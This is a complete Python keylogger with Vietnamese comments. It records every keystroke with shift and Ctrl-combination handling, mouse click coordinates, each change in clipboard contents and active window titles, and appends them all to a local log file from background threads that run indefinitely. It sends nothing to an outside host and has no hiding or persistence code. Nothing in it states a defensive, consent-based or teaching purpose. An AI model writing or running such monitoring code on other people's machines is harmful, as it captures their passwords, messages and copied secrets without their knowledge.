from pynput import mouse, keyboard
import os
import time
import threading
import pyperclip
import pygetwindow as gw

# ===== CẤU HÌNH =====
log_dir = "DATA"
os.makedirs(log_dir, exist_ok=True) # Tạo thư mục nếu chưa tồn tại
log_file = os.path.join(log_dir, "key_log.txt")
log_lock = threading.Lock()
pressed_keys = set()

# ===== ASCII CONTROL MAP =====
ascii_control_map = {
    '\x03': 'Ctrl+C',
    '\x16': 'Ctrl+V',
    '\x18': 'Ctrl+X',
    '\x1A': 'Ctrl+Z'
}

# ===== GHI LOG =====
def write_log(text):
    with log_lock:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(text + "\n")

# ===== BÀN PHÍM =====
def on_press(key):
    pressed_keys.add(key)

    try:
        if isinstance(key, keyboard.KeyCode) and key.char:
            char = key.char

            # Kiểm tra xem là ASCII điều khiển
            if char in ascii_control_map:
                write_log(f"[Tổ hợp phím] {ascii_control_map[char]}")
            else:
                if (keyboard.Key.shift in pressed_keys or 
                    keyboard.Key.shift_l in pressed_keys or
                    keyboard.Key.shift_r in pressed_keys):
                    write_log(f"[Phím_0] {char.upper()}")
                else:
                    write_log(f"[Phím_1] {char}")
        else:
            write_log(f"[Phím đặc biệt] {key}")
    except AttributeError:
        write_log(f"[LỖI] Không xác định phím: {key}")

def on_release(key):
    try:
        if key in pressed_keys:
            pressed_keys.remove(key)
    except:
        pass

# ===== CHUỘT =====
def on_click(x, y, button, pressed):
    if pressed:
        write_log(f"[Chuột] Nhấn tại ({x}, {y}) với {button}")

# ===== CLIPBOARD =====
def clipboard_monitor():
    old = ""
    while True:
        try:
            data = pyperclip.paste()
            if data != old:
                if data in ascii_control_map:
                    write_log(f"[Clipboard] {ascii_control_map[data]}")
                else:
                    write_log(f"[Clipboard] {data}")
                old = data
        except:
            pass
        time.sleep(1)

# ===== CỬA SỔ =====
def window_monitor():
    last_title = ""
    while True:
        try:
            win = gw.getActiveWindow()
            if win and win.title != last_title:
                write_log(f"[Cửa sổ hoạt động] {win.title}")
                last_title = win.title
        except:
            pass
        time.sleep(1)

# ===== KHỞI CHẠY =====
if __name__ == "__main__":
    keyboard.Listener(on_press=on_press, on_release=on_release).start()
    mouse.Listener(on_click=on_click).start()
    threading.Thread(target=clipboard_monitor, daemon=True).start()
    threading.Thread(target=window_monitor, daemon=True).start()

    while True:
        time.sleep(10)
